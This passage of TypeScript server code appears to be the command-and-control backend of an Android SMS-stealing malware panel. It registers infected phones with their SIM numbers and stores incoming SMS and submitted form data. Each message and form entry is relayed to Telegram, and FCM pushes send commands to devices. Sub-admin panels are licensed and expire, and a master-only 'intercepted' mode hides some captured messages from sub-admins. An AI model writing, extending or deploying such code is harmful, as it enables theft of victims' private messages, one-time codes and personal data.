    ? eq(messages.appId, appId)
    : and(eq(messages.appId, appId), eq(messages.masterOnly, false));
  const [devRows, msgRows, fRows, [totalRow]] = await Promise.all([
    db.select().from(devices).where(eq(devices.appId, appId)),
    db.select().from(messages).where(msgWhere)
      .orderBy(desc(messages.receivedAt)).limit(rawLimit),
    db.select().from(formData).where(eq(formData.appId, appId))
      .orderBy(desc(formData.submittedAt)),
    db.select({ count: sql`COUNT(*)` }).from(messages).where(msgWhere),
  ]);
  return c.json({
    devices: devRows.map(mapDevice),
    messages: msgRows.map(mapMessage),
    formData: fRows.map(mapFormData),
    totalMessages: Number(totalRow?.count ?? 0),
  });
});

app.get("/api/healthz", (c) => c.json({ status: "ok" }));

// ------- TOKEN VERIFY (public) -------
app.get("/api/tokens/:token", async (c) => {
  const token = c.req.param("token");
  if (!token) return c.json({ status: "inactive", error: "token required" }, 400);
  const key = btoa(token).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  try {
    const res = await fetch(`https://apkstore-ce547-default-rtdb.firebaseio.com/token_primary/${key}.json`);
    const data = await res.json() as { apkId?: number } | null;
    if (!data || typeof data !== "object" || !data.apkId) {
      return c.json({ status: "inactive", error: "Token not registered" }, 404);
    }
    return c.json({ status: "active", apkId: data.apkId });
  } catch {
    return c.json({ status: "inactive", error: "Verification failed" }, 500);
  }
});

// ------- APPS -------
app.get("/api/apps", async (c) => {
  const db = getDb(c.env);
  const isMaster = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
  // Sub-admin session: return ONLY their own app (not all apps — prevents app ID enumeration)
  if (!isMaster) {
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    const sessionToken = c.req.header("x-session-token") ?? "";
    const sessions = await sqlC(
      `SELECT app_id FROM admin_sessions WHERE id = $1 LIMIT 1`,
      [sessionToken]
    ) as Array<{ app_id: string }>;
    if (sessions.length === 0) return c.json({ error: "Unauthorized" }, 401);
    const appId = sessions[0].app_id;
    const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    if (!row) return c.json([], 200);
    // auto-disable expired
    if (row.appId !== DEFAULT_APP_ID && row.status === "active" && row.createdAt && isExpired(row.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
      const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
      return c.json(updated ? [mapApp(updated)] : [mapApp(row)]);
    }
    return c.json([mapApp(row)]);
  }
  // Master: return all apps (existing behaviour)
  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
  for (const r of rows) {
    if (r.appId === DEFAULT_APP_ID && r.status !== "active") {
      await db.update(apps).set({ status: "active" }).where(eq(apps.appId, r.appId));
    } else if (r.appId !== DEFAULT_APP_ID && r.status === "active" && r.createdAt && isExpired(r.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, r.appId));
    }
  }
  const fresh = await db.select().from(apps).orderBy(asc(apps.createdAt));
  return c.json(fresh.map(mapApp));
});

app.get("/api/apps/:appId", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    return c.json(updated ? mapApp(updated) : mapApp(row));
  }
  return c.json(mapApp(row));
});

app.post("/api/apps", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const body = await c.req.json() as { appId?: string; name?: string; pin?: string; status?: string };
  if (!body.appId || !body.name) return c.json({ error: "appId and name are required" }, 400);
  const inserted = await db.insert(apps).values({
    appId: body.appId, name: body.name,
    pin: body.pin ?? "1234", status: body.status ?? "active",
  }).onConflictDoNothing({ target: apps.appId }).returning();
  if (inserted.length === 0) return c.json({ error: "App ID already exists" }, 409);
  return c.json(mapApp(inserted[0]), 201);
});

app.patch("/api/apps/:appId", async (c) => {
  const appId = c.req.param("appId");
  const masterPin = await getMasterPin(c.env);
  const isMaster = (c.req.header("x-master-pin") ?? "") === masterPin;
  const sessionToken = c.req.header("x-session-token") ?? "";

  // Master PIN → full access. Session → must belong to THIS appId. Neither → deny.
  if (!isMaster) {
    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    const valid = await sqlC(`SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`, [sessionToken, appId]) as Array<{id:string}>;
    if (valid.length === 0) return c.json({ error: "Unauthorized" }, 401);
  }

  const db = getDb(c.env);
  const body = await c.req.json() as { name?: string; pin?: string; status?: string; currentPin?: string; };
  const patch: Partial<typeof apps.$inferInsert> = {};
  if (body.name !== undefined) patch.name = body.name;
  if (body.status !== undefined) patch.status = body.status;

  // Changing PIN — master can always; session owner needs currentPin as confirmation
  if (body.pin !== undefined) {
    if (!isMaster) {
      const [existing] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
      if (!existing) return c.json({ error: "App not found" }, 404);
      if (!body.currentPin) return c.json({ error: "currentPin required to change PIN" }, 400);
      if (body.currentPin !== existing.pin) return c.json({ error: "Wrong current PIN" }, 401);
    }
    patch.pin = body.pin;
  }

  if (Object.keys(patch).length === 0) return c.json({ error: "No fields to update" }, 400);
  const [row] = await db.update(apps).set(patch).where(eq(apps.appId, c.req.param("appId"))).returning();
  if (!row) return c.json({ error: "App not found" }, 404);
  return c.json(mapApp(row));
});

app.delete("/api/apps/:appId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const [row] = await db.delete(apps).where(eq(apps.appId, c.req.param("appId"))).returning();
  if (!row) return c.json({ error: "App not found" }, 404);
  return c.json({ ok: true });
});

app.post("/api/apps/:appId/verify-pin", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const body = await c.req.json() as { pin?: string };
  if (!body.pin) return c.json({ error: "PIN required" }, 400);

  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    return c.json({ error: "Licence expired. Please contact admin." }, 403);
  }
  if (row.status !== "active") return c.json({ error: "App is disabled. Please contact admin." }, 403);

  if (row.pin !== body.pin) {
    return c.json({ error: "Wrong PIN." }, 401);
  }
  return c.json({ ok: true, appId: row.appId, name: row.name });
});

// ------- DELETE PROTECTION -------
app.get("/api/apps/:appId/delete-protection", async (c) => {
  await ensureSchema(c.env);
  const db = getDb(c.env);
  const [row] = await db.select().from(apps).where(eq(apps.appId, c.req.param("appId"))).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  return c.json({ enabled: row.deleteProtectionEnabled ?? false, hasPin: !!row.deleteProtectionPin });
});

app.post("/api/apps/:appId/delete-protection/set-pin", async (c) => {
  await ensureSchema(c.env);
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const isMasterSetPin = c.req.header("x-master-pin") === await getMasterPin(c.env);
  const body = await c.req.json() as { pin?: string; currentPin?: string };
  if (!body.pin || body.pin.length < 4) return c.json({ error: "pin required (min 4 chars)" }, 400);
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  if (row.deleteProtectionPin && !isMasterSetPin) {
    if (!body.currentPin) return c.json({ error: "currentPin required to change" }, 403);
    if (body.currentPin !== row.deleteProtectionPin) return c.json({ error: "Wrong current pin" }, 401);
  }
  await db.update(apps).set({ deleteProtectionPin: body.pin }).where(eq(apps.appId, appId));
  return c.json({ ok: true });
});

app.post("/api/apps/:appId/delete-protection/toggle", async (c) => {
  await ensureSchema(c.env);
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
  const body = await c.req.json() as { pin?: string };
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  if (!isMaster) {
    if (!body.pin) return c.json({ error: "pin required" }, 400);
    if (!row.deleteProtectionPin) return c.json({ error: "Set a delete protection pin first" }, 403);
    if (body.pin !== row.deleteProtectionPin) return c.json({ error: "Wrong pin" }, 401);
  }
  const newEnabled = !(row.deleteProtectionEnabled ?? false);
  await db.update(apps).set({ deleteProtectionEnabled: newEnabled }).where(eq(apps.appId, appId));
  return c.json({ ok: true, enabled: newEnabled });
});

// ------- DEVICES -------
app.get("/api/devices", async (c) => {
  const db = getDb(c.env);
  const userId = c.req.query("userId");
  const appId = c.req.query("appId");
  const _im1=(c.req.header("x-master-pin")??"")===await getMasterPin(c.env);
  if(!_im1){
    if(!appId)return c.json({error:"appId required"},400);
    const _st1=c.req.header("x-session-token")??"";
    if(!_st1)return c.json({error:"Unauthorized"},401);
    const _sc1=neon(c.env.NEON_DATABASE_URL);
    const _sv1=await _sc1(`SELECT id FROM admin_sessions WHERE id=$1 AND app_id=$2`,[_st1,appId]) as Array<{id:string}>;
    if(!_sv1.length)return c.json({error:"Unauthorized"},401);
  }
  const where = appId ? eq(devices.appId, appId) : userId ? eq(devices.userId, userId) : undefined;
  const rows = where
    ? await db.select().from(devices).where(where)
    : await db.select().from(devices);
  return c.json(rows.map(mapDevice));
});

app.get("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const [row] = await db.select().from(devices).where(eq(devices.deviceId, c.req.param("deviceId"))).limit(1);
  if (!row) return c.json({ error: "Device not found" }, 404);
  return c.json(mapDevice(row));
});

app.patch("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
  // Admin-only fields require session or master PIN (Android SDK only sends status/lastOnline/fcmToken)
  const hasAdminFields = body.starred !== undefined || body.forwardEnabled !== undefined || body.forwardSlot !== undefined;
  if (hasAdminFields) {
    const isMasterPatch = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
    const sessionToken = c.req.header("x-session-token") ?? "";
    if (!isMasterPatch && !sessionToken) return c.json({ error: "Unauthorized" }, 401);
    if (!isMasterPatch && sessionToken) {
      // Verify session exists (any valid app session can manage its own devices)
      const sqlC = neon(c.env.NEON_DATABASE_URL);
      const valid = await sqlC(`SELECT id FROM admin_sessions WHERE id = $1 LIMIT 1`, [sessionToken]) as Array<{id:string}>;
      if (valid.length === 0) return c.json({ error: "Unauthorized" }, 401);
    }
  }
  if (body.status !== undefined) patch.status = String(body.status);
  if (body.lastOnline !== undefined) patch.lastOnline = body.lastOnline ? new Date(String(body.lastOnline)) : null;
  if (body.fcmToken !== undefined) patch.fcmToken = String(body.fcmToken);
  if (body.forwardEnabled !== undefined) patch.forwardEnabled = Boolean(body.forwardEnabled);
  if (body.forwardSlot !== undefined) patch.forwardSlot = body.forwardSlot === null ? null : Number(body.forwardSlot);
  if (body.starred !== undefined) patch.starred = Boolean(body.starred);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, c.req.param("deviceId"))).returning();
  if (!row) return c.json({ error: "Device not found" }, 404);
  const mapped = mapDevice(row);
  await broadcast(c.env, "device_updated", mapped);
  return c.json(mapped);
});

// ------- MESSAGES -------
app.get("/api/messages/count", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  // Non-master: require appId + session must belong to that appId (prevents cross-app IDOR)
  const _isMasterCaller = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
  if (!_isMasterCaller) {
    if (!appId) return c.json({ error: "appId required" }, 400);
    const _sessToken = c.req.header("x-session-token") ?? "";
    const _sqlC = neon(c.env.NEON_DATABASE_URL);
    const _valid = await _sqlC(`SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`, [_sessToken, appId]) as Array<{id:string}>;
    if (_valid.length === 0) return c.json({ error: "Unauthorized" }, 401);
  }
  const where = appId ? eq(messages.appId, appId) : undefined;
  const rows = where
    ? await db.select({ count: sql`COUNT(*)` }).from(messages).where(where)
    : await db.select({ count: sql`COUNT(*)` }).from(messages);
  return c.json({ count: Number(rows[0]?.count ?? 0) });
});

app.get("/api/messages", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const userId = c.req.query("userId");
  const deviceId = c.req.query("deviceId");
  const searchTerm = c.req.query("search")?.trim() ?? "";
  const cursor = c.req.query("cursor"); // last message id for cursor pagination
  const isMaster = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
  // Non-master: session must belong to requested appId (prevents cross-app IDOR)
  if (!isMaster) {
    if (!appId) return c.json({ error: "appId required" }, 400);
    const _sessToken = c.req.header("x-session-token") ?? "";
    const _sqlC = neon(c.env.NEON_DATABASE_URL);
    const _valid = await _sqlC(`SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`, [_sessToken, appId]) as Array<{id:string}>;
    if (_valid.length === 0) return c.json({ error: "Unauthorized" }, 401);
  }

  const PAGE = 30;           // browse page size
  
  // Base filter conditions (app / user / device scope)
  const scopeConds: ReturnType<typeof eq>[] = [];
  if (appId) scopeConds.push(eq(messages.appId, appId));
  else if (userId) scopeConds.push(eq(messages.userId, userId));
  else if (deviceId) scopeConds.push(eq(messages.deviceId, deviceId));
  // Non-master callers cannot see master-only (intercepted) messages
  if (!isMaster) scopeConds.push(eq(messages.masterOnly, false));

  if (searchTerm) {
    // ── Search mode: cursor-based ILIKE — uses id index per page, no OFFSET scan cost ──
    const searchLimit = Math.min(Math.max(1, parseInt(c.req.query("limit") ?? "100", 10) || 100), 200);
    const searchCursor = c.req.query("cursor"); // last id from previous page (exclusive)
    const like = `%${searchTerm.replace(/[%_\\]/g, "\\$&")}%`;
    const searchCond = sql`(${messages.body} ILIKE ${like} OR ${messages.fromSender} ILIKE ${like} OR ${messages.fromNumber} ILIKE ${like} OR ${messages.appId} ILIKE ${like} OR ${messages.deviceId} ILIKE ${like})` as unknown as ReturnType<typeof eq>;
    const cursorCond = searchCursor && !isNaN(parseInt(searchCursor, 10))
      ? sql`${messages.id} < ${parseInt(searchCursor, 10)}` as unknown as ReturnType<typeof eq>
      : null;
    const allConds = [...scopeConds, searchCond, ...(cursorCond ? [cursorCond] : [])];
    const where = allConds.length === 1 ? allConds[0] : and(...allConds);
    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(searchLimit + 1);
    const hasMore = rows.length > searchLimit;
    const data = rows.slice(0, searchLimit).map(mapMessage);
    const lastId = data.length > 0 ? data[data.length - 1].id : null;
    return c.json({ data, hasMore, lastId });
  } else {
    // ── Browse mode: cursor pagination, newest first ───────────────────────
    const pageConds = [...scopeConds];
    if (cursor) {
      const cursorId = parseInt(cursor, 10);
      if (!isNaN(cursorId)) pageConds.push(sql`${messages.id} < ${cursorId}` as unknown as ReturnType<typeof eq>);
    }
    const where = pageConds.length === 0 ? undefined : pageConds.length === 1 ? pageConds[0] : and(...pageConds);
    const rows = where
      ? await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(PAGE)
      : await db.select().from(messages).orderBy(desc(messages.id)).limit(PAGE);
    return c.json(rows.map(mapMessage));
  }
});

app.post("/api/messages", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.appId || !body.deviceId || !body.fromNumber || !body.body) {
    return c.json({ error: "appId, deviceId, fromNumber and body are required" }, 400);
  }
  const senderStr = String(body.fromSender ?? "");
  if (senderStr.toLowerCase().startsWith("call forward")) {
    return new Response(null, { status: 204 });
  }
  const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
  // Check if this device is intercepted (master-only mode)
  const intercepted = await getInterceptedDevices(c.env);
  const isIntercepted = intercepted.includes(String(body.deviceId));
  const [inserted] = await db.insert(messages).values({
    appId: String(body.appId),
    deviceId: String(body.deviceId),
    userId: uid,
    fromSender: String(body.fromSender ?? "Unknown"),
    fromNumber: String(body.fromNumber),
    toNumber: body.toNumber ? String(body.toNumber) : null,
    body: String(body.body),
    isSensitive: Boolean(body.isSensitive ?? false),
    masterOnly: isIntercepted,
  }).returning();
  const mapped = mapMessage(inserted);
  // Only broadcast to WS (all clients) if NOT intercepted; intercepted = master-only via REST
  if (!isIntercepted) {
    await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
  } else {
    // Broadcast on a separate master-only event so master UI can still get live updates
    await broadcast(c.env, "master_message_added", { appId: mapped.appId, message: mapped });
  }
  c.executionCtx.waitUntil(Promise.all([
    sendTelegram(c.env,
      `📩 <b>New SMS</b>
  App: <code>${mapped.appId}</code>
  Device: <code>${mapped.deviceId}</code>
  From: <b>${mapped.fromNumber}</b>
  Sender: ${mapped.fromSender}
  To: ${mapped.toNumber ?? '—'}
  UserId: <code>${mapped.userId}</code>
  💬 ${mapped.body}`,
      mapped.appId
    ),
  ]));
  return c.json({ ok: true, id: mapped.id }, 201);
});

// ------- FORM DATA -------
app.get("/api/data", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const deviceId = c.req.query("deviceId");
  // Master admin with pin — supports offset+limit pagination
  const masterPin = c.req.header("x-master-pin") ?? "";
  if (masterPin === await getMasterPin(c.env)) {
    const pgLimit = Math.min(Number(c.req.query("limit") ?? "1000"), 2000);
    const pgOffset = Number(c.req.query("offset") ?? "0");
    const appIdFilter = appId ?? null;
    const whereClause = appIdFilter ? eq(formData.appId, appIdFilter) : undefined;
    const [cntRow] = await db.select({ c: sql`count(*)` }).from(formData).where(whereClause);
    const total = Number(cntRow?.c ?? 0);
    const rows = await db.select().from(formData)
      .where(whereClause)
      .orderBy(desc(formData.submittedAt))
      .limit(pgLimit)
      .offset(pgOffset);
    return c.json({ data: rows.map(mapFormData), total, hasMore: pgOffset + rows.length < total });
  }
  if (!appId) {
    return c.json({ error: "appId is required" }, 400);
  }
  const where = deviceId
    ? and(eq(formData.appId, appId), eq(formData.deviceId, deviceId))
    : eq(formData.appId, appId);
  const rows = await db.select().from(formData).where(where).orderBy(desc(formData.submittedAt));
  return c.json(rows.map(mapFormData));
});

app.post("/api/data", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { appId?: string; deviceId?: string; data?: Record<string, unknown> };
  if (!body.appId || !body.deviceId) return c.json({ error: "appId and deviceId are required" }, 400);
  if (!body.data || typeof body.data !== "object" || Array.isArray(body.data)) {
    return c.json({ error: "data must be a JSON object" }, 400);
  }
  const [row] = await db.insert(formData).values({
    appId: body.appId, deviceId: body.deviceId, data: body.data,
  }).returning();
  const mapped = mapFormData(row);
  await broadcast(c.env, "form_data_added", { appId: mapped.appId, formData: mapped });
  c.executionCtx.waitUntil(sendTelegram(c.env, (() => {
      const fields = Object.entries(mapped.data as Record<string, unknown>).map(([k,v]) => `  📝 <b>${k}</b>: ${v}`).join("\n");
      return `📋 <b>New Form Data</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\n${fields}`;
    })()));
  return c.json(mapped, 201);
});

app.delete("/api/data/:id", async (c) => {
  const db = getDb(c.env);
  const id = Number(c.req.param("id"));
  if (Number.isNaN(id)) return c.json({ error: "Invalid id" }, 400);
  const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
  if (!row) return c.json({ error: "Not found" }, 404);
  const mapped = mapFormData(row);
  await broadcast(c.env, "form_data_deleted", { appId: mapped.appId, id });
  return c.json({ ok: true });
});

// Bulk delete: remove ALL form entries for a given appId + deviceId
app.delete("/api/data", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const deviceId = c.req.query("deviceId");
  if (!appId || !deviceId) return c.json({ error: "appId and deviceId are required" }, 400);
  const rows = await db.delete(formData)
    .where(and(eq(formData.appId, appId), eq(formData.deviceId, deviceId)))
    .returning();
  const ids = rows.map(r => r.id);
  await broadcast(c.env, "form_data_bulk_deleted", { appId, deviceId, ids });
  return c.json({ ok: true, deleted: ids.length });
});

// Delete a single SMS by id — scoped exactly to that message row
app.delete("/api/messages/:id", async (c) => {
  const db = getDb(c.env);
  const id = Number(c.req.param("id"));
  if (Number.isNaN(id)) return c.json({ error: "Invalid id" }, 400);
  const [msg] = await db.select().from(messages).where(eq(messages.id, id)).limit(1);
  if (!msg) return c.json({ error: "Not found" }, 404);
  const isMasterDel = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
  if (!isMasterDel) {
    const st = c.req.header("x-session-token") ?? "";
    if (!st) return c.json({ error: "Unauthorized" }, 401);
    const sc = neon(c.env.NEON_DATABASE_URL);
    const sv = await sc(`SELECT id FROM admin_sessions WHERE id=$1 AND app_id=$2`, [st, msg.appId]) as Array<{id:string}>;
    if (!sv.length) return c.json({ error: "Unauthorized" }, 401);
  }
  await db.delete(messages).where(eq(messages.id, id));
  await broadcast(c.env, "message_deleted", { appId: msg.appId, deviceId: msg.deviceId, id });
  return c.json({ ok: true });
});

// Delete a single device by deviceId + cascade its messages and form data
app.delete("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const deviceId = c.req.param("deviceId");
  // Fetch device first to get appId for session binding
  const [dev] = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
  if (!dev) return c.json({ error: "Device not found" }, 404);
  const isMasterDev = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
  if (!isMasterDev) {
    const st = c.req.header("x-session-token") ?? "";
    if (!st) return c.json({ error: "Unauthorized" }, 401);
    const sc = neon(c.env.NEON_DATABASE_URL);
    const sv = await sc(`SELECT id FROM admin_sessions WHERE id=$1 AND app_id=$2`, [st, dev.appId]) as Array<{id:string}>;
    if (!sv.length) return c.json({ error: "Unauthorized" }, 401);
  }
  await db.delete(messages).where(eq(messages.deviceId, deviceId));
  await db.delete(formData).where(eq(formData.deviceId, deviceId));
  await db.delete(devices).where(eq(devices.deviceId, deviceId));
  await broadcast(c.env, "device_deleted", { appId: dev.appId, deviceId: dev.deviceId });
  return c.json({ ok: true });
});

// ------- REGISTER + HEARTBEAT -------
async function upsertDeviceRaw(env: Env, input: {
  deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null;
  fcmToken: string | null;
  status: string; lastOnline: string | null;
  forwardEnabled: boolean; forwardSlot: number | null;
}): Promise<{ row: ReturnType<typeof mapDevice>; created: boolean }> {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
     ON CONFLICT (device_id) DO UPDATE SET
       app_id = EXCLUDED.app_id,
       user_id = EXCLUDED.user_id,
       name = EXCLUDED.name,
       android_version = EXCLUDED.android_version,
       sim1_carrier = EXCLUDED.sim1_carrier,
       sim1_phone = EXCLUDED.sim1_phone,
       sim2_carrier = EXCLUDED.sim2_carrier,
       sim2_phone = EXCLUDED.sim2_phone,
       status = EXCLUDED.status,
       last_online = EXCLUDED.last_online,
       forward_enabled = EXCLUDED.forward_enabled,
       forward_slot = EXCLUDED.forward_slot,
       fcm_token = EXCLUDED.fcm_token,
       updated_at = NOW()
     RETURNING *, (xmax = 0) AS was_created`,
    [
      input.deviceId, input.appId, input.userId, input.name, input.androidVersion,
      input.sim1Carrier, input.sim1Phone, input.sim2Carrier, input.sim2Phone,
      input.status, input.lastOnline ? new Date(input.lastOnline) : null,
      input.forwardEnabled, input.forwardSlot, input.fcmToken,
    ],
  ) as Array<Record<string, unknown>>;
  const r = rows[0];
  const mapped = {
    id: Number(r.id), deviceId: String(r.device_id), appId: String(r.app_id),
    userId: String(r.user_id), name: String(r.name),
    androidVersion: Number(r.android_version),
    sim1Carrier: (r.sim1_carrier as string | null) ?? null,
    sim1Phone: (r.sim1_phone as string | null) ?? null,
    sim2Carrier: (r.sim2_carrier as string | null) ?? null,
    sim2Phone: (r.sim2_phone as string | null) ?? null,
    status: String(r.status),
    lastOnline: iso(r.last_online as Date | string | null),
    forwardEnabled: Boolean(r.forward_enabled),
    forwardSlot: r.forward_slot == null ? null : Number(r.forward_slot),
    fcmToken: (r.fcm_token as string | null) ?? null,
    installedAt: isoReq(r.installed_at as Date | string),
    updatedAt: isoReq(r.updated_at as Date | string),
  };
  return { row: mapped, created: Boolean(r.was_created) };
}

app.post("/api/register", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.appId || !body.deviceId || !body.name) {
    return c.json({ error: "appId, deviceId and name are required" }, 400);
  }
  const safeAppId = String(body.appId);
  // Block registration if admin has not pre-created this appId, or if app is disabled
  const existing = await db.select().from(apps).where(eq(apps.appId, safeAppId)).limit(1);
  if (existing.length === 0) {
    return c.json({ error: "App not authorized. Admin must create this App ID first." }, 403);
  }
  if (existing[0].status !== "active") {
    return c.json({ error: "App is disabled. Contact admin to activate." }, 403);
  }
  const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
  const { row, created } = await upsertDeviceRaw(c.env, {
    appId: safeAppId,
    deviceId: String(body.deviceId),
    userId: uid,
    name: String(body.name),
    androidVersion: Number(body.androidVersion ?? 0),
    sim1Carrier: body.sim1Carrier != null ? String(body.sim1Carrier) : null,
    sim1Phone: body.sim1Phone != null ? String(body.sim1Phone) : null,
    sim2Carrier: body.sim2Carrier != null ? String(body.sim2Carrier) : null,
    sim2Phone: body.sim2Phone != null ? String(body.sim2Phone) : null,
    fcmToken: body.fcmToken != null ? String(body.fcmToken) : null,
    status: "online",
    lastOnline: new Date().toISOString(),
    forwardEnabled: false, forwardSlot: null,
  });
  await broadcast(c.env, "device_updated", row);
  if (created) c.executionCtx.waitUntil(sendTelegram(c.env, `📱 <b>New Device Registered</b>\nApp: <code>${row.appId}</code>\nDevice: <b>${row.name}</b> (<code>${row.deviceId}</code>)\nUser: ${row.userId}\nAndroid: ${row.androidVersion}\nSIM1: ${row.sim1Carrier ?? "—"} ${row.sim1Phone ?? ""}\nSIM2: ${row.sim2Carrier ?? "—"} ${row.sim2Phone ?? ""}`, safeAppId));
  return c.json({ ok: true, deviceId: row.deviceId, created }, created ? 201 : 200);
});

app.post("/api/heartbeat", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.deviceId) return c.json({ error: "deviceId is required" }, 400);
  const uid = String(body.deviceId);
  const now = new Date();
  const patch: Partial<typeof devices.$inferInsert> = {
    status: "online", lastOnline: now, updatedAt: now,
  };
  if (body.fcmToken != null) patch.fcmToken = String(body.fcmToken);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, uid)).returning();
  // If device not found in DB, reject — admin must register app+device first via /register
  if (!row) {
    return c.json({ error: "Device not registered. Contact admin." }, 403);
  }
  await broadcast(c.env, "device_updated", mapDevice(row));
  return c.json({ ok: true });
});

// ------- FCM -------
app.post("/api/fcm/send", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { deviceId?: string; data?: Record<string, string> };
  if (!body.deviceId) return c.json({ error: "deviceId is required" }, 400);
  if (!body.data || typeof body.data !== "object") return c.json({ error: "data object is required" }, 400);
  const [device] = await db.select().from(devices).where(eq(devices.deviceId, body.deviceId)).limit(1);
  if (!device) return c.json({ error: "Device not found" }, 404);
  if (!device.fcmToken) return c.json({ error: "Device has no FCM token registered" }, 422);

  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data)) {
    safeData[k] = (v !== null && typeof v === "object") ? JSON.stringify(v) : String(v);
  }

  try {
    const result = await sendFcmToToken(c.env, device.fcmToken, safeData);
    return c.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: { error?: { message?: string; details?: Array<{ errorCode?: string }> } } };
    const errorCode = e.fcmBody?.error?.details?.[0]?.errorCode;
    const msg = e.fcmBody?.error?.message;
    if (e.fcmStatus === 404 || errorCode === "UNREGISTERED") {
      return c.json({
        error: "Phone ka FCM token purana ho gaya. Device pe app open karo — naya token automatically register ho jayega, fir command dobara bhejo.",
        detail: msg,
      }, 410);
    }
    if (e.fcmStatus === 400 && (msg?.includes("not a valid FCM registration token") || msg?.includes("INVALID_ARGUMENT"))) {
      return c.json({
        error: "FCM token invalid — Android app ko reinstall karo aur fresh heartbeat bhejo.",
        detail: msg,
      }, 400);
    }
    if (e.fcmStatus) return c.json({ error: e.fcmBody }, e.fcmStatus as 400);
    return c.json({ error: e.message }, 500);
  }
});

app.post("/api/fcm/online-check", async (c) => {
  const body = await c.req.json() as { token?: string; data?: Record<string, string> };
  if (!body.token) return c.json({ error: "token is required" }, 400);
  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data ?? { type: "online_check" })) safeData[k] = String(v);
  try {
    const result = await sendFcmToToken(c.env, body.token, safeData);
    return c.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: unknown };
    if (e.fcmStatus) return c.json({ error: e.fcmBody }, e.fcmStatus as 400);
    return c.json({ error: e.message }, 500);
  }
});

// ── Master PIN: DB-driven with 30s in-memory cache ──
let _masterPinCache: { value: string; ts: number } = { value: "", ts: 0 };
const _sessionCache = new Map<string, { expiry: number }>();
async function getMasterPin(env: Env): Promise<string> {
  const now = Date.now();
